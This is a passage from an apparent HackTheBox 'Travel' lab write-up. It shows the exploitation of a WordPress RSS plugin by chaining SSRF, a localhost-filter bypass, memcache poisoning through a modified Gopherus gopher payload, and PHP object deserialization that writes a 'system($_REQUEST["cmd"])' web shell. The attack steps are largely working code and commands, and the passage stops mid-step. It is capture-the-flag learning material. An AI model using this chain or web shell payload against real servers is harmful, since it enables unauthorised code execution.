+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>➜  prashant nc <span class="nt">-nlvp</span> 80
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.10.189.
+Ncat: Connection from 10.10.10.189:60344.
+GET / HTTP/1.1
+Host: 10.10.14.9
+User-Agent: curl/7.64.0
+Accept: <span class="k">*</span>/<span class="k">*</span>
+</pre></table></code></div></div><blockquote><p>dict:// for something better</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>curl <span class="s2">"http://blog.travel.htb/awesome-rss/?custom_feed_url=dict://10.10.14.9"</span> <span class="o">&gt;</span> /dev/null
+</pre></table></code></div></div><blockquote><p>Listener</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>➜  prashant nc <span class="nt">-nlvp</span> 80
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.10.189.
+Ncat: Connection from 10.10.10.189:55204.
+GET /? HTTP/1.1
+Host: 10.10.14.9
+User-Agent: SimplePie/1.3.1 <span class="o">(</span>Feed Parser<span class="p">;</span> http://simplepie.org<span class="p">;</span> Allow like Gecko<span class="o">)</span> Build/20130911040210
+Accept-Encoding: deflate, <span class="nb">gzip
+</span>Referer: http://10.10.14.9/?#
+Accept: application/atom+xml, application/rss+xml, application/rdf+xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9, application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8, text/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8, text/html<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7, unknown/unknown<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.1, application/unknown<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.1, <span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.1
+</pre></table></code></div></div><p>We got some <code class="language-plaintext highlighter-rouge">juicy</code> stuff….What if we try it with <code class="language-plaintext highlighter-rouge">ssrf</code></p><p>If we look at the <code class="language-plaintext highlighter-rouge">template.php</code> There are few protections</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"file://"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"@"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-o"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-F"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
+	<span class="c1">// preventing all localhost access</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"localhost"</span> <span class="k">or</span> <span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>		
+	<span class="p">}</span>
+</pre></table></code></div></div><blockquote><p><code class="language-plaintext highlighter-rouge">SSRF</code></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/travel/5470d0a6-18e5-4781-8dcc-104102772ecf/image-7.png" alt="SSRF-protection" /></p><p>Ahhh…We got the error successfuly <code class="language-plaintext highlighter-rouge">localhost:80</code></p><blockquote><p><code class="language-plaintext highlighter-rouge">memcache</code></p></blockquote><p>The line from <code class="language-plaintext highlighter-rouge">rss_template.php</code> reveals that the memcache is running</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="na">set_cache_location</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">);</span>
+</pre></table></code></div></div><h2 id="twentytwenty-theme-dir">twentytwenty theme dir</h2><blockquote><p>README.md</p></blockquote><p>The line from the file reveals the new dir called <code class="language-plaintext highlighter-rouge">wp-content/themes/twentytwenty</code></p><h2 id="debugphp">debug.php</h2><p>There is a mention of a file called <code class="language-plaintext highlighter-rouge">debug.php</code> which is commented in <strong>rss_template.php</strong></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>DEBUG
+<span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])){</span>
+  <span class="k">include</span><span class="p">(</span><span class="s1">'debug.php'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>After some guessing and brain farts i was able to get the location of the file <code class="language-plaintext highlighter-rouge">debug.php</code></p><blockquote><p>http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/travel/5470d0a6-18e5-4781-8dcc-104102772ecf/image-8.png" alt="Debug.php" /></p><h1 id="getting-memcache-outpput-on-debugphp">Getting memcache outpput on debug.php</h1><p>Now after spemding half of my day i figured out that if we make a request to the</p><blockquote><p>http://blog.travel.htb/awesome-rss/?debug&amp;custom_feed_url=http://IP/feed.xml</p></blockquote><p>Where <code class="language-plaintext highlighter-rouge">feed.xml</code> will be the xml file from the</p><blockquote><p>http://travel.htb/newsfeed/customfeed.xml</p></blockquote><h2 id="hack---steps">Hack - steps</h2><p>Just Download the <code class="language-plaintext highlighter-rouge">customfeed.xml</code> and serve it on your <strong>python-server</strong> and access the <code class="language-plaintext highlighter-rouge">debug.php</code> and you are good to go.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>➜  travel git:<span class="o">(</span>master<span class="o">)</span> ✗ wget http://travel.htb/newsfeed/customfeed.xml feed.xml
+<span class="nt">--2020-05-21</span> 14:21:41--  http://travel.htb/newsfeed/customfeed.xml
+Resolving travel.htb <span class="o">(</span>travel.htb<span class="o">)</span>... 10.10.10.189
+Connecting to travel.htb <span class="o">(</span>travel.htb<span class="o">)</span>|10.10.10.189|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6423 <span class="o">(</span>6.3K<span class="o">)</span> <span class="o">[</span>text/xml]
+Saving to: ‘customfeed.xml.1’
+
+customfeed.xml.1                      100%[<span class="o">=======================================================================&gt;]</span>   6.27K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.003s  
+
+2020-05-21 14:21:42 <span class="o">(</span>2.38 MB/s<span class="o">)</span> - ‘customfeed.xml.1’ saved <span class="o">[</span>6423/6423]
+
+<span class="nt">--2020-05-21</span> 14:21:42--  http://feed.xml/
+Resolving feed.xml <span class="o">(</span>feed.xml<span class="o">)</span>... failed: Name or service not known.
+wget: unable to resolve host address ‘feed.xml’
+FINISHED <span class="nt">--2020-05-21</span> 14:21:42--
+Total wall clock <span class="nb">time</span>: 1.0s
+Downloaded: 1 files, 6.3K <span class="k">in </span>0.003s <span class="o">(</span>2.38 MB/s<span class="o">)</span>
+➜  travel git:<span class="o">(</span>master<span class="o">)</span> ✗
+</pre></table></code></div></div><p>And now access the url</p><blockquote><p>http://blog.travel.htb/awesome-rss/?debug&amp;custom_feed_url=http://10.10.14.9:80/feed.xml</p></blockquote><p><code class="language-plaintext highlighter-rouge">Python-server</code> got hitted</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>➜  travel git:<span class="o">(</span>master<span class="o">)</span> ✗ python <span class="nt">-m</span> SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.189 - - <span class="o">[</span>21/May/2020 14:23:17] <span class="s2">"GET /feed.xml HTTP/1.1"</span> 200 -
+10.10.10.189 - - <span class="o">[</span>21/May/2020 14:23:17] <span class="s2">"GET /feed.xml HTTP/1.1"</span> 200 -
+</pre></table></code></div></div><p>And now if we access the url</p><blockquote><p>http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php</p></blockquote><p>We can the data dumped from the memchache</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/travel/5470d0a6-18e5-4781-8dcc-104102772ecf/image-9.png" alt="memcache" /></p><p>Got the following data</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>| xct_641ca1d89d<span class="o">(</span>...<span class="o">)</span> | a:4:<span class="o">{</span>s:5:<span class="s2">"child"</span><span class="p">;</span>a:1:<span class="o">{</span>s:0:<span class="s2">""</span><span class="p">;</span>a:1:<span class="o">{(</span>...<span class="o">)</span> | 
+</pre></table></code></div></div><blockquote><p>Ahh..yes we got it cheers !!</p></blockquote><p>But the <code class="language-plaintext highlighter-rouge">question</code> is whats it ? i mean what is <code class="language-plaintext highlighter-rouge">641ca1d89d</code> and <code class="language-plaintext highlighter-rouge">a:4:{s:5:"child";a:1:{s:0:"";a:1:{</code></p><p>Well These are the partial strings.</p><h1 id="php---deserialization">Php - Deserialization</h1><p>The Code used in <code class="language-plaintext highlighter-rouge">template.php</code> is used for <strong>php - serialization</strong></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">TemplateHelper</span>
+<span class="p">{</span>
+
+    <span class="k">private</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">init</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>    	
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="o">.</span><span class="s1">'/logs/'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>You can read about this thing here</p><blockquote><p><a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/" target="_blank">https://www.notsosecure.com/remote-code-execution-via-php-unserialize/</a></p></blockquote><h2 id="ananlyzing-what-we-need">Ananlyzing what we need</h2><p>I came across a tool called <code class="language-plaintext highlighter-rouge">Gopherus</code></p><blockquote><p><a href="https://github.com/tarunkant/Gopherus" target="_blank">https://github.com/tarunkant/Gopherus</a></p></blockquote><p>Where its just generating a <code class="language-plaintext highlighter-rouge">gopher</code> payload to exploit ssrf since we know that there exist a <code class="language-plaintext highlighter-rouge">php-memcache</code> so we can go for this tool.</p><h2 id="bypassing-ssrf-filter">Bypassing SSRF Filter</h2><p>So its a very easy to <code class="language-plaintext highlighter-rouge">bypass</code> this filter since its only checking for the</p><ul><li><strong>localhost</strong><li><strong>127.0.0.1</strong></ul><p>We can use <code class="language-plaintext highlighter-rouge">LOCALHOST</code> or <code class="language-plaintext highlighter-rouge">127.00.0.1</code> or <code class="language-plaintext highlighter-rouge">127.1</code> or anything you would like.</p><h1 id="building-the-exploit">Building the exploit</h1><p>If we look at the code from <code class="language-plaintext highlighter-rouge">template.php</code></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">TemplateHelper</span>
+<span class="p">{</span>
+
+    <span class="k">private</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">init</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>    	
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="o">.</span><span class="s1">'/logs/'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>The class is <code class="language-plaintext highlighter-rouge">TemplateHelper</code> and it using two variables <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">data</code></p><blockquote><p>logs dir</p></blockquote><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="o">.</span><span class="s1">'/logs/'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+</pre></table></code></div></div><p>The content from the ssrf is going to save in dir <code class="language-plaintext highlighter-rouge">logs</code> <strong>/logs/file</strong></p><p>Cool !!!!!….</p><h2 id="what-is-the-key-for-the-memcache-service">What is the key for the memcache service</h2><p>If we look up at the <code class="language-plaintext highlighter-rouge">docs</code> of <strong>simplepie</strong> we can see that the service is just converting the url to the <code class="language-plaintext highlighter-rouge">md5 hash</code> of the url we specify.</p><p>You can read about the docs here</p><blockquote><p><a href="https://simplepie.org/api/source-class-SimplePie.html" target="_blank">https://simplepie.org/api/source-class-SimplePie.html</a></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>md5<span class="o">(</span>md5<span class="o">(</span><span class="nv">$url</span><span class="o">)</span>:<span class="s2">"spc"</span><span class="o">)</span>
+</pre></table></code></div></div><p>Oh…we almost got it ….The hash we got from the <code class="language-plaintext highlighter-rouge">debug.php</code> was a md5 but partial and the values were also partial….</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>| xct_641ca1d89d<span class="o">(</span>...<span class="o">)</span> | a:4:<span class="o">{</span>s:5:<span class="s2">"child"</span><span class="p">;</span>a:1:<span class="o">{</span>s:0:<span class="s2">""</span><span class="p">;</span>a:1:<span class="o">{(</span>...<span class="o">)</span> |
+</pre></table></code></div></div><p>This <code class="language-plaintext highlighter-rouge">641ca1d89d</code> is a partial md5 hash of the url that we specified</p><h2 id="gophers">gophers</h2><p>If we look at the tool <code class="language-plaintext highlighter-rouge">Gopherus</code> it has a seperate module called <code class="language-plaintext highlighter-rouge">phpmemcache</code> which is just configured according to the user requirements who made it . We need to do some changes in it. Like the <code class="language-plaintext highlighter-rouge">key</code> and the <code class="language-plaintext highlighter-rouge">value</code> of its.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="k">def</span> <span class="nf">PHPMemcached</span><span class="p">():</span>
+    <span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[01m"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">This is usable when you know Class and Variable name used by user</span><span class="se">\n</span><span class="s">"</span><span class="o">+</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
+
+    <span class="n">code</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[96m"</span> <span class="o">+</span><span class="s">"Give serialization payload</span><span class="se">\n</span><span class="s">example: O:5:</span><span class="se">\"</span><span class="s">Hello</span><span class="se">\"</span><span class="s">:0:{}   : "</span><span class="o">+</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">)</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="ow">not</span> <span class="n">code</span><span class="p">):</span>
+        <span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span> <span class="o">+</span> <span class="s">"Plz give payload"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
+        <span class="nb">exit</span><span class="p">()</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"%0d%0aset SpyD3r 4 0 "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">))</span> <span class="o">+</span> <span class="s">"%0d%0a"</span> <span class="o">+</span>  <span class="n">code</span> <span class="o">+</span> <span class="s">"%0d%0a"</span>
+
+    <span class="n">finalpayload</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"+"</span><span class="p">,</span><span class="s">"%20"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%2F"</span><span class="p">,</span><span class="s">"/"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%25"</span><span class="p">,</span><span class="s">"%"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%3A"</span><span class="p">,</span><span class="s">":"</span><span class="p">)</span>
+
+    <span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span> <span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">Your gopher link is ready to do SSRF : </span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
+    <span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[04m"</span> <span class="o">+</span> <span class="s">"gopher://127.0.0.1:11211/_"</span> <span class="o">+</span> <span class="n">finalpayload</span> <span class="o">+</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
+    <span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span> <span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">After everything done, you can delete memcached item by using this payload: </span><span class="se">\n</span><span class="s">"</span><span class="o">+</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
+    <span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[04m"</span> <span class="o">+</span> <span class="s">"gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"</span><span class="o">+</span> <span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
+    <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="s">"</span><span class="se">\033</span><span class="s">[41m"</span> <span class="o">+</span><span class="s">"-----------Made-by-SpyD3r-----------"</span><span class="o">+</span><span class="s">"</span><span class="se">\033</span><span class="s">[0m"</span>
+</pre></table></code></div></div><p>This is the <code class="language-plaintext highlighter-rouge">PHPMemcached.py</code> from the tool <code class="language-plaintext highlighter-rouge">Gopherus</code></p><p>Here we can see that its using <code class="language-plaintext highlighter-rouge">127.0.0.1</code> and the key as <code class="language-plaintext highlighter-rouge">SpyD3r</code>.</p><p>The changes we are going to do in our script will be</p><ul><li><strong>127.00.0.1</strong><li><strong>The required key rather than SpyD3r</strong><li><strong>The varibale code</strong></ul><h2 id="the-proper-key-and-values">The proper key and values</h2><p>The proper key will be the</p><blockquote><p><code class="language-plaintext highlighter-rouge">md5(md5("http://www.travel.htb/newsfeed/customfeed.xml"):"spc")</code></p></blockquote><p>That will be <code class="language-plaintext highlighter-rouge">4e5612ba079c530a6b1f148c0b352241</code></p><p>Since it follows a pattern of <strong>xct_key</strong> the final key will be</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>xct_4e5612ba079c530a6b1f148c0b352241
+</pre></table></code></div></div><p>And the values will be as the <code class="language-plaintext highlighter-rouge">serialized - payload</code></p><h2 id="hack---steps-1">Hack - steps</h2><p>So..what i am going to do is first i will <strong>php-serialization + ssrf + phpmemcache</strong> Where i will trigger the payload that will be in <code class="language-plaintext highlighter-rouge">serialized</code> manner and after that i will trigger the <code class="language-plaintext highlighter-rouge">php-deserialization</code> and will get the rce.</p><blockquote><p>code variable</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">code</span> <span class="o">=</span> <span class="s">'O:14:"TemplateHelper":2:{s:4:"file";s:'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">file</span><span class="p">))</span><span class="o">+</span><span class="s">':"'</span><span class="o">+</span><span class="nb">file</span><span class="o">+</span><span class="s">'";s:4:"data";s:31:"&lt;?php system($_REQUEST["cmd"]);";}'</span>
+</pre></table></code></div></div><blockquote><p>payload for serialzation</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="n">payload</span> <span class="o">=</span> <span class="s">"%0d%0aset xct_4e5612ba079c530a6b1f148c0b352241 4 0 "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">))</span> <span class="o">+</span> <span class="s">"%0d%0a"</span> <span class="o">+</span>  <span class="n">code</span> <span class="o">+</span> <span class="s">"%0d%0a"</span>
+    <span class="n">encodedpayload</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"+"</span><span class="p">,</span><span class="s">"%20"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%2F"</span><span class="p">,</span><span class="s">"/"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%25"</span><span class="p">,</span><span class="s">"%"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%3A"</span><span class="p">,</span><span class="s">":"</span><span class="p">)</span>
+</pre></table></code></div></div><p>And now i will <code class="language-plaintext highlighter-rouge">encode</code> it</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">encodedpayload</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"+"</span><span class="p">,</span><span class="s">"%20"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%2F"</span><span class="p">,</span><span class="s">"/"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%25"</span><span class="p">,</span><span class="s">"%"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"%3A"</span><span class="p">,</span><span class="s">":"</span><span class="p">)</span>
+</pre></table></code></div></div><p>And then i will supply the url in the</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>http://blog.travel.htb/awesome-rss/?debug<span class="o">=</span><span class="nb">yes</span>&amp;custom_feed_url<span class="o">=</span>encodedpayload
+</pre></table></code></div></div><p>And after that i will trigger the <code class="language-plaintext highlighter-rouge">deserialization</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>http://blog.travel.htb/wp-content/themes/twentytwenty/logs/file
